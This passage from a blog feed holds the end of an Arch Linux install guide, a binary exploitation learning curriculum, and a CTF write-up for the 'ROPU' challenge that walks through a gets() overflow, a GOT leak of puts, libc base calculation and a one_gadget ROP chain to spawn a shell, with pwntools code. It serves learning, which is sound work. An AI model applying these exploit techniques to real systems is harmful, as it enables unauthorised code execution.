... localhostmyhostname</span></span><br><span class="line"><span class="comment"># ::1 ... localhostmyhostname</span></span><br><span class="line">vim /etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Install Wireless Packages</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># You may need to install additional firmware packages to use wireless.</span></span><br><span class="line">pacman -S iw wpa_supplicant dialog</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Install Useful Software</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># net-tools give you ifconfig</span></span><br><span class="line">pacman -S wget net-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Set Root Password</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">passwd</span><br></pre></td></tr></table></figure><h2 id="Boot-Managers-and-Kernels"><a href="#Boot-Managers-and-Kernels" class="headerlink" title="Boot Managers and Kernels"></a>Boot Managers and Kernels</h2><p>The base installation is complete. We now need a way to make sure we can boot into our new Linux system. I used the rEFInd boot manager with a custom theme to accomplish this, though you can use GRUB too.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Install intel-ucode for Intel Processors</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">pacman -S intel-ucode</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Install rEFInd</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">pacman -S refind-efi</span><br><span class="line">refind-install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: You must adjust kernel options in /boot/refind-linux.conf manually.</span></span><br><span class="line"><span class="comment"># rEFInd cannot populate the proper boot entries while running refind-install from</span></span><br><span class="line"><span class="comment"># a bootable flash drive.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Get Root Partition&#x27;s UUID</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="built_in">ls</span> -l /dev/disk/by-uuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Create Arch Folder for Kernel</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># By making the parent directory of the kernel &quot;arch&quot;, rEFInd will display</span></span><br><span class="line"><span class="comment"># an icon for Arch Linux on the boot screen.</span></span><br><span class="line"><span class="built_in">cd</span> /boot &amp;&amp; <span class="built_in">mkdir</span> <span class="built_in">arch</span></span><br><span class="line"><span class="built_in">mv</span> vmlinuz-linux intel-ucode.img refind_linux.conf initramfs-linux.img initramfs-linux-fallback.img <span class="built_in">arch</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Update refind-linux.conf</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line">vim /boot/arch/refind-linux.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Update config file:</span></span><br><span class="line"><span class="comment"># &quot;Boot with standard options&quot;  &quot;root=UUID=&lt;UUID_root&gt; rw initrd=/boot/arch/intel-ucode.img initrd=/boot/arch/initramfs-linux.img quiet splash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NOTE 1: If /boot is on a different partition,</span></span><br><span class="line"><span class="comment">#         then instead of /boot/arch/intel-ucode.img, put arch/intel-ucode.img.</span></span><br><span class="line"><span class="comment">#         Same with anything found in the /boot partition (initramfs-linux.img).</span></span><br><span class="line"><span class="comment"># NOTE 2: intel-ucode must be before initramfs.</span></span><br><span class="line"><span class="comment"># NOTE 3: You can delete the other two boot options if you want</span></span><br><span class="line"><span class="comment">#         (the ones other than &quot;Boot with standard options&quot;).</span></span><br><span class="line"><span class="comment"># NOTE 4: Here are some of the useful kernel parameters.</span></span><br><span class="line"><span class="comment"># quiet - Don&#x27;t display every single systemd message on boot;</span></span><br><span class="line"><span class="comment">#         just important ones like errors and warnings.</span></span><br><span class="line"><span class="comment"># root=UUID=... - Tells kernel which partition has the root filesystem.</span></span><br><span class="line"><span class="comment"># initrd = ... - Loads these images, enables microcode updates.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Update refind.conf</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Check saved settings on GitHub</span></span><br><span class="line">vim /boot/EFI/refind/refind.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Download rEFInd Icons / Theme in /boot/EFI/refind</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Replace icons directory with custom icons from GitHub</span></span><br><span class="line"><span class="comment"># Replace background.png, selection-big.png, selection-small.png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="comment"># Exit and Reboot</span></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="built_in">exit</span> <span class="comment"># Exits chroot environment</span></span><br><span class="line">umount -R /mnt <span class="comment"># Unmounts partitions</span></span><br><span class="line">reboot <span class="comment"># Reboots into actual system</span></span><br></pre></td></tr></table></figure><h2 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h2><p>Awesome! After the above steps, you should be able to see a boot manager like the one at the beginning of this article whenever you boot, allowing you to boot into your newly installed Arch or your existing Windows operating system. In my next post, I will discuss how you can set up and customize your new Arch Linux.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Arch </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn Path</title>
      <link href="/Path/"/>
      <url>/Path/</url>
      
        <content type="html"><![CDATA[<p>I’ve been learning the basics of reverse engineering and binary exploitation for almost a year now. While I don’t consider myself an expert, I’ve learned more than I thought possible for myself in a short time. One of the problems I’ve had was finding good problem sets designed for learning with increasing steps of difficulty. So, I’m creating my own series of challenges curated from various sources that provide a good progression of difficulty for anyone interested in binary exploitation.</p><p>Note that I give a solution description for each challenge. These challenges are not meant for you to frustrate yourself with finding vulnerabilities - you’ll eventually be able to do that after playing with a binary and it’ll just waste your time while you’re learning. Here, anyone who wants to learn a specific exploitation technique can refer to a sample problem and learn by doing.</p><h2 id="Level-0-Reverse-Engineering-with-IOLI"><a href="#Level-0-Reverse-Engineering-with-IOLI" class="headerlink" title="Level 0: Reverse Engineering with IOLI"></a>Level 0: Reverse Engineering with IOLI</h2><p>The IOLI crackmes are the best place to start if you have zero experience with looking at binaries. A crackme is a challenge in which you are given a compiled program that requires a password. Usually, we aren’t given the program source code so we have to figure out what the necessary input is from the assembly instructions in the binary.</p><p>In each of the IOLI crackmes, the binary will ask the user for a password and then print whether or not that password was correct. Our goal is to reverse engineer the correct passwords and gain access. Personally, I only think it’s worth doing these challenges until crackme0x07 since the solutions can get repetitive.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>crackme0x00a</td><td>Hardcoded string comparison</td></tr><tr><td>crackme0x00b</td><td>Interesting hardcoded string comparison</td></tr><tr><td>crackme0x01</td><td>Hardcoded integer comparison</td></tr><tr><td>crackme0x02</td><td>Using GDB to avoid long computations</td></tr><tr><td>crackme0x03</td><td>String obfuscation and educated guessing</td></tr><tr><td>crackme0x04</td><td>Operations on string characters</td></tr><tr><td>crackme0x05</td><td>Bitwise operations</td></tr><tr><td>crackme0x06</td><td>Environment variables</td></tr><tr><td>crackme0x07</td><td>Stripped symbols</td></tr></tbody></table><p>Download: <a href="challenges/crackmes.tar.gz">crackmes.tar.gz</a></p><p>Original: <a href="http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/2/challenges.zip">challenges.zip</a></p><h2 id="Level-1-Buffer-Overflows"><a href="#Level-1-Buffer-Overflows" class="headerlink" title="Level 1: Buffer Overflows"></a>Level 1: Buffer Overflows</h2><p>Now that you have a basic understanding of assembly language, static analysis, and debugging, you are ready to learn about buffer overflows. In a buffer overflow, you provide more data to a program than can fit in a specified buffer - causing the program to overwrite important data on the stack such as local variables and saved instruction pointers.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>MBE Lab 2C</td><td>Controlling stack variables</td></tr><tr><td>MBE Lab 2B</td><td>Calling functions with arguments</td></tr><tr><td>MBE Lab 2A</td><td>Call a function in a weird way</td></tr></tbody></table><p>These challenges and many of the future ones come from RPISEC’s Modern Binary Exploitation course. I highly recommend you go through their slides prior to attempting these challenges. They give you detailed explanations on how the exploits work and even provide useful commands.</p><p><a href="https://github.com/RPISEC/MBE/releases/download/v1.1_release/MBE_lectures.tar.gz">PDFs of MBE Lectures</a></p><p><a href="https://github.com/RPISEC/MBE/releases/download/v1.1_release/MBE_release.tar.gz">Compiled MBE Binaries</a></p><h2 id="Level-2-Shellcoding"><a href="#Level-2-Shellcoding" class="headerlink" title="Level 2: Shellcoding"></a>Level 2: Shellcoding</h2><p>In the previous challenges, there was always a “shell” function that you just could call which would give you a shell. However, there’s almost never a random shell function lying around in a real program.</p><p>Shellcoding is the art of writing instructions you want to execute on the stack, and then overwriting the return address pointer to point to the shellcode you wrote. Note that shellcode doesn’t necessarily need to spawn a shell; shellcode refers to any executable code that the user provided - even if it’s as simple as printing “Hello World”.</p><p>MBE Lab 3C | Returning to shellcode<br>MBE Lab 3B | Write shellcode that doesn’t spawn a shell<br>MBE Lab 3A | Write non-contiguous shellcode (limited space)</p><h2 id="Level-3-ROP-Emporium"><a href="#Level-3-ROP-Emporium" class="headerlink" title="Level 3: ROP Emporium"></a>Level 3: ROP Emporium</h2><p>These days, shellcoding problems occur less frequently. This is because of a protection built into binaries called “NX bit” or “W^X”. NX stands for no-execute and refers to the fact that that writeable sections of memory must also be non-executable. This way, even if an attacker gains access to the instruction pointer, they can’t redirect execution to code that they wrote since the section that they wrote to will be non-executable.</p><p>However, attackers have come up with ways to bypass this protection in the form of return-oriented programming, or ROP. We still overflow and control the instruction pointer, but now we execute chains of instructions that already exist in the binary’s code or in imported code.</p><p>The majority of these challenges come from ROP Emporium, which I found to be an excellent set of challenges for learning ROP chaining. For more information about each challenge, visit the ROP Emporium website linked below. It will tell you what kind of exploit you need to do and give you hints (which will save you the trouble of having to reverse engineer the problem before beginning the exploit). You should make sure to do both the 32-bit and 64-bit challenges since there are interesting nuances between the architectures that will affect your ROP chains.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>ret2win</td><td>Controlling $eip</td></tr><tr><td>split</td><td>Calling functions with arguments, both found in the binary</td></tr><tr><td>callme</td><td>Calling exteral functions using the PLT</td></tr><tr><td>write4</td><td>Pass arbitrary arguments to functions that expect pointers by writing to .data</td></tr><tr><td>fluff</td><td>Using more difficult gadget patterns to construct ROP chains</td></tr><tr><td>pivot</td><td>Stack pivoting and adding offsets to get to a new function in libc file. You may want to do this after finishing Level 4.</td></tr></tbody></table><p>Original: <a href="https://ropemporium.com/">ROP Emporium</a></p><h2 id="Level-4-Format-Strings"><a href="#Level-4-Format-Strings" class="headerlink" title="Level 4: Format Strings"></a>Level 4: Format Strings</h2><p>We’ve been doing relatively simple overflows until now - we just happen to overwrite data on the stack because the program read in more input than it should. What other ways can we control the instruction pointer? Format strings! Format strings are often used with functions like <code>printf</code> to interpret sequences of bytes as integers, or characters, or even pointers. <code>printf</code> doesn’t get passed in the number arguments to it - so if a format string was read as <code>%x%x%x</code> and the user didn’t provide three numbers, then <code>printf</code> just starts reading up the stack and printing out three numbers since it’ll think that those were the arguments to it. You can see the problems that this might cause. There is also a special format string, <code>%n</code>, which will allow you to write to arbitrary regions of memory.</p><p>For more information, read the MBE slides on format strings and check out this excellent <a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">tutorial</a>.</p><p>Format string challenges are important but can be a little tricky. You might argue that they are less complicated than ROP challenges, but I think it helps to learn the stack well and understand what memory sections are writeable before learning to exploit format string vulnerabilities. The challenges in this section are from angstromCTF 2018 and include the source code for each binary.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>Number Guess</td><td>Leak private local variables</td></tr><tr><td>Letter</td><td>Use <code>%n</code> to overwrite data in arbitrary memory locations</td></tr></tbody></table><p>Download: <a href="challenges/format_strings.tar.gz">format_strings.tar.gz</a></p><h2 id="Level-5-Gadgets-in-Shared-Objects-Defeating-ASLR"><a href="#Level-5-Gadgets-in-Shared-Objects-Defeating-ASLR" class="headerlink" title="Level 5: Gadgets in Shared Objects &amp; Defeating ASLR"></a>Level 5: Gadgets in Shared Objects &amp; Defeating ASLR</h2><p>Until now with the ROP Emporium challenges, we’ve been solely using gadgets found in the binary that we’re running. However, you can also use gadgets found in the linked shared object files such as libc.so. In fact, this will usually make your exploits easier because there are so many gadgets in the libc shared object.</p><p>There is a catch though - it is slightly more work to ROP chain using the shared objects. Shared objects are compiled with a protection known as PIE, which stands for Position Independent Execution. If you look at a shared object file in a disassembler, you’ll see that each instruction’s address is something like <code>0x00000xxx</code>. This indicates that the .so file was compiled with PIE. When the shared object is loaded and run, the operating system chooses a random base address and all the address in the shared object are referenced by <code>random_base + 0x00000xxx</code>. This is known as ASLR.</p><p>When an operating system has ASLR enabled and a binary is compiled with PIE, you can’t just jump to a fixed gadget addresses found in the binary and expect the jump to work. This is because the shared object’s base address will be randomized during the load time of the library. So how can we defeat this protectoin?</p><p>Well, the offsets within the library remain the same between runs even if the base addresses are different. Therefore, if you know the full address of any function, you can use the offsets in the .so file to calculate the address of any other function in that shared object. Getting the address of any function in the PLT is known as a leak.</p><p>The reason we haven’t had to deal with ASLR in the ROP Emporium challenges (even though ASLR was enabled!) is that we only looked for gadgets in the binary itself. Those binaries were not compiled with PIE (position independent execution), so ASLR didn’t affect them. Shared objects are always compiled with PIE, so ASLR affects them. If we had compiled the binaries in ROP Emporium with PIE, then you’d have to do the same kind of leak as discussed before to get the addresses of the gadgets before being able to jump to them. After leaking, the process is the same as usual for constructing a ROP chain.</p><table><thead><tr><th>Challenge</th><th>Description</th></tr></thead><tbody><tr><td>ROPU</td><td>Leak an address using puts, then jump to a target from one-gadget.</td></tr><tr><td>Ropasaurus Rex</td><td>Another leak but slightly more difficult (uses read() &#x2F; write())</td></tr><tr><td>scv</td><td>Leak a stack canary using format strings</td></tr></tbody></table><h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><p>I’m working on creating a set of solutions for each of these challenges. Once it’s done, I’ll post it here.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary Exploitation </tag>
            
            <tag> Reverse Engineering </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Defeating ASLR With a Leak</title>
      <link href="/Defeating-ASLR-with-a-Leak/"/>
      <url>/Defeating-ASLR-with-a-Leak/</url>
      
        <content type="html"><![CDATA[<h2 id="ROPU-Writeup"><a href="#ROPU-Writeup" class="headerlink" title="ROPU Writeup"></a>ROPU Writeup</h2><p><i class="fas fa-flag"></i> GOT address leak to calculate libc base and jump to one_gadget address<br><i class="fas fa-download"></i> <a href="challenge.tar.gz">challenge.tar.gz</a><br><i class="fas fa-download"></i> <a href="solve.py">Solution</a></p><p>This is a CTF problem from UMBC’s 2018 Spring CTF. There were only two solves on this challenge including our own team, despite it not being too difficult, so I figured this would be a good problem to do a writeup for.</p><h3 id="Controlling-rip"><a href="#Controlling-rip" class="headerlink" title="Controlling $rip"></a>Controlling $rip</h3><p>We are given two files:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">libc-2.23.so  ROPU</span><br></pre></td></tr></table></figure><p>One is a binary, and the other is a libc file. So, we copy in our <a href="/binexploit-init">exploit initialization script</a>, mark the binary executable with <code>chmod +x ROPU</code>, and run it.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./ROPU</span><br><span class="line">Enter the payload!</span><br><span class="line">banana</span><br><span class="line">banana%</span><br></pre></td></tr></table></figure><p>The program seems to be very simple. It reads some input into a buffer and calls <code>printf</code> on that buffer. We can verify this by opening the binary in IDA and viewing the <code>getInput</code> function.</p><img src="/Defeating-ASLR-with-a-Leak/getInput.png" class=""><p>Great! We can see that the input function is <code>gets</code>, which we know is insecure. <code>gets</code> doesn’t stop reading input until a <code>\n</code> character is entered, which it replaces with a null-byte. The buffer is 0x20 bytes large according to IDA, so we can easily overflow the input buffer and control the instruction pointer.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./ROPU</span><br><span class="line">Enter the payload!</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[1]    31000 segmentation fault (core dumped)  ./ROPU</span><br></pre></td></tr></table></figure><p>To find the exact offset of the return address on the stack, I use the following lines in my script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(cyclic(<span class="number">100</span>, n=<span class="number">8</span> <span class="keyword">if</span> x64 <span class="keyword">else</span> <span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>This generates a De Bruijn sequence of characters that we can use to identify offsets and sends it to the stdin of the program. After running it, we get the following output.</p><img src="/Defeating-ASLR-with-a-Leak/pattern_offset.png" class=""><p>After the program read the input, it continued and eventually segfaulted. Note that the binary didn’t actually run the <code>ret</code> instruction. In 64-bit binaries, the binary actually segfaults before it runs the segfaulting instruction. In this case, we segfault because we are trying to pop <code>faaaaaaa</code> into the $rip. This string is part of the De Bruijn sequence that we inputted. Using pwntools, we can figure out the offset in the sequence where this string occurs, and create a string exactly that large.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf = cyclic_find(<span class="string">&#x27;faaaaaaa&#x27;</span>, n=<span class="number">8</span>) * <span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Address-Resolution-in-Shared-Objects"><a href="#Address-Resolution-in-Shared-Objects" class="headerlink" title="Address Resolution in Shared Objects"></a>Address Resolution in Shared Objects</h3><p>Now that we can control the instruction pointer, we need to figure out how we can run an arbitrary sequence of instructions to open a shell.</p><p>After running <code>checksec</code> on the binary, we notice that NX is enabled and there is no stack canary.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ROPU</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>Having NX enabled means we can’t just write shellcode and jump to it on the stack. Therefore, we’ll have to construct a ROP chain.</p><p>Unfortunately, the binary is so small that we’d have to come up with a clever ROP chain to use the gadgets within the binary to give us a shell. Since we are lazy, and since the binary is dynamically linked, let’s instead see if we can construct a ROP chain using the numerous gadgets in the libc file.</p><p>In order to construct a ROP chain using those gadgets, we need to leak the address of a function in the libc file from the GOT. This is because on a system with ASLR enabled, we can’t just jump to a hard-coded address in the shared object file. For a detailed explanation, see <a href="#Dynamic-Linking-with-Shared-Objects">Dynamic Linking with Shared Objects</a>.</p><h3 id="Defeating-ASLR-with-a-Leak"><a href="#Defeating-ASLR-with-a-Leak" class="headerlink" title="Defeating ASLR with a Leak"></a>Defeating ASLR with a Leak</h3><p>Let’s say we found out that <code>printf</code> is located at address <code>0x08048bca</code>. Let’s also assume that in the libc file, there is a shell function 0x30 bytes away from the beginning of the <code>printf</code> function. Then, we know that the shell function is located at <code>0x08048bca + 0x30</code> in the randomized memory too. This is because the whole address isn’t randomized - only the base <code>0x08048</code> is. The offsets between functions in the shared object will remain constant between the file and when it’s loaded into memory at runtime.</p><p>In order to leak an address from the GOT, let’s call the <code>puts</code> function with argument the address we want to leak. Since we are calling <code>puts</code>, we can be sure that GOT[‘puts’] will have an entry, so we’ll just leak that.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = cyclic_find(<span class="string">&#x27;faaaaaaa&#x27;</span>, n=<span class="number">8</span>) * <span class="string">&#x27;a&#x27;</span> <span class="comment"># 40 bytes</span></span><br><span class="line">buf += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># Return address - call the puts function</span></span><br><span class="line">buf += p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># Argument to puts - GOT[&#x27;puts&#x27;]</span></span><br></pre></td></tr></table></figure><p>There is a small mistake above though. In a 64-bit binary, arguments are passed into registers before the stack (see <a href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64">here</a>). Therefore, we will need to first pop the argument (GOT[‘puts’]) into $rdi, and only then can we call <code>puts</code>.</p><p>I used <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to search for gadgets within the binary that pop into $rdi</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ROPU | less</span><br></pre></td></tr></table></figure><p>In the output, I found the following:</p><img src="/Defeating-ASLR-with-a-Leak/pop_rdi.png" class=""><p>So, by ropping to address 0x0000000000400783, we can pop the argument for <code>puts</code> into $rdi, and then call <code>puts</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">buf = cyclic_find(<span class="string">&#x27;faaaaaaa&#x27;</span>, n=<span class="number">8</span>) * <span class="string">&#x27;a&#x27;</span> <span class="comment"># 40 bytes</span></span><br><span class="line">buf += p64(pop_rdi) <span class="comment"># First call pop_rdi to pop got[&#x27;puts&#x27;] into $rdi</span></span><br><span class="line">buf += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">buf += p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># Now actually call puts</span></span><br><span class="line">buf += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># Run the binary again</span></span><br><span class="line">p.sendline(buf)</span><br></pre></td></tr></table></figure><p>Now, when the program runs, it will print “Enter the payload!”, read in our ROP chain, call <code>printf</code> to echo back our input like usual, and finally call <code>puts</code> to print the value in GOT[‘puts’] to stdout. We can capture that output and use it to calculate the base address of libc as follows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Receive the GOT address of puts</span></span><br><span class="line">leaked_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;Address of puts: &#x27;</span> + <span class="built_in">hex</span>(leaked_puts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compute libc base</span></span><br><span class="line">libc_base = leaked_puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br></pre></td></tr></table></figure><p>In line two, I received 6 bytes from the process - which is the number of bytes of any address in a 64-bit binary. You might think it should be 8 bytes, but even 64-bit CPUs only use 48-bit addresses today. Before I can unpack the 6 bytes into an integer, I have to pad it with bytes until it is 64-bits long for the <code>u64</code> function to decode it.</p><p>Now that we have the libc base, we can jump to any gadget we want to in the libc file! But wait - we already sent our payload! Where do we send the new addresses in the libc file that we want to jump to? Well, we can send another payload by just running the binary again from <code>main</code>. The binary hasn’t quit yet, so the offsets and base addresses will all remain the same.</p><h3 id="Shell-Gadget"><a href="#Shell-Gadget" class="headerlink" title="Shell Gadget"></a>Shell Gadget</h3><p>Using a tool called <a href="https://github.com/david942j/one_gadget">one_gadget</a>, we can search for a single gadget that gives us a shell in the libc.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget <span class="string">&quot;libc-2.23.so&quot;</span></span><br><span class="line">0x45216 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>Note that while <code>one_gadget</code> found several for us, it does impose constraints on each gadget that must be met before the gadget is called. I will use the first gadget since it is the simplest - but before I can use it, I need to ensure that $rax &#x3D; 0. I do this by searching for gadgets that pop values into $rax using ROPgadget as I did before. I couldn’t find a simple one in the binary itself, but when I ran it on the libc file, I found a simple <code>pop $rax; ret;</code> so I decided to use that. Immediately after, we can use the <code>one_gadget</code> gadget to give us a shell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shell = <span class="number">0x45216</span> <span class="comment"># Condition: rax = NULL</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000033544</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send payload two</span></span><br><span class="line">buf = cyclic_find(<span class="string">&#x27;faaaaaaa&#x27;</span>, n=<span class="number">8</span>) * <span class="string">&#x27;a&#x27;</span> <span class="comment"># 40 bytes</span></span><br><span class="line">buf += p64(pop_rax + libc_base)</span><br><span class="line">buf += p64(<span class="number">0</span>)</span><br><span class="line">buf += p64(shell + libc_base)</span><br><span class="line">buf += p64(libc.symbols[<span class="string">&#x27;exit&#x27;</span>] + libc_base)</span><br><span class="line">p.sendline(buf)</span><br></pre></td></tr></table></figure><p>Line 9 is unnecessary for the exploit to work, but it does let the program exit gracefully once the shell completes.</p><p><a href="solve.py">Here</a> is our final exploit code. After running it, we get the following.</p><img src="/Defeating-ASLR-with-a-Leak/success.png" class=""><p>Awesome, we got a shell!</p><h3 id="Dynamic-Linking-with-Shared-Objects"><a href="#Dynamic-Linking-with-Shared-Objects" class="headerlink" title="Dynamic Linking with Shared Objects"></a>Dynamic Linking with Shared Objects</h3><p>To understand why we need to leak an address, we need to understand how code from shared objects is run. When ASLR is enabled on an operating system, every time a program runs, the address of each function it uses from a 